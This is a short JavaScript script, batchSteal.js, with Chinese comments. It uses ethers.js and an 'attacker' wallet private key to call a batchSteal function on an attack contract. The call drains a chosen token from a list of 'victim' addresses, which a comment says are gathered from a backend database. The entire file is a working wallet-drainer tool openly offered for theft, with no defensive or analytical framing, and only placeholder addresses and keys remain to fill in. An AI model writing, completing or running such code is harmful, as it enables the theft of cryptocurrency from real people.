// batchSteal.js
const { ethers } = require("ethers");

// 收集到的受害者地址列表（可从你的后端数据库读取）
const victims = [
    "0xVictim1",
    "0xVictim2",
    "..."
];

const provider = new ethers.providers.JsonRpcProvider("https://goerli.infura.io/v3/YOUR_KEY");
const attackerWallet = new ethers.Wallet("你的攻击者私钥", provider);
const attackContractABI = ["function batchSteal(address token, address[] victims)"];
const attackContract = new ethers.Contract("0xYourAttackContract", attackContractABI, attackerWallet);

async function stealAll() {
    console.log(`开始批量盗取，共 ${victims.length} 个地址`);
    const tx = await attackContract.batchSteal("0xTokenAddress", victims);
    console.log("盗取交易:", tx.hash);
    await tx.wait();
    console.log("完成！");
}
stealAll();
